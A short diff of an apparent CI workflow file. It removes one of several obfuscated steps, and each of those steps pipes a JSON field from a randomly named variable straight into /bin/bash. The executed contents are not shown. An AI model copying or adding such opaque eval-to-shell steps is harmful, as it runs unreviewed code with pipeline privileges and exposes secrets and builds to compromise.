@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$vnxxr402" | jq -r .gb157 | /bin/bash
           echo $li374 | jq -r .v72 | /bin/bash
           printf '%s' "$sbd657" | jq -r .y792 | /bin/bash
-          echo $dhrw1021 | jq -r .koqzo12 | /bin/bash
           echo $pbf1948 | jq -r .k80590 | /bin/bash
           printf '%s' "$ivdm57797" | jq -r .vnoo64 | /bin/bash
           echo $laq09 | jq -r .eq73 | /bin/bash
